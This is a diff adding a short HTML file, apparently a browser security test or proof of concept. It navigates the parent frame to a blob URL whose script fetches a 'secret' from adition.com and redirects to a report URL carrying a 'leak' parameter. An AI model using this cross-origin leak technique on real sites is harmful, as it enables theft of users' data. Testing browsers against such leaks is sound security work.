@@ -1,0 +1,5 @@
+<!doctype html>
+<script>
+  var payload = "<!doctype html><script>var req = new XMLHttpRequest(); req.onreadystatechange = function () { if (this.readyState == 4 && this.status == 200) { document.location.href = 'https://adition.com/report/?leak=c1115628-WebKitBlob'; } }; req.open('GET', 'https://adition.com/custom/c1115628-WebKitBlob/secret', true); req.send();<\/script>"
+  parent.location = URL.createObjectURL(new WebKitBlob([payload], { type: 'text/html' }))
+</script>
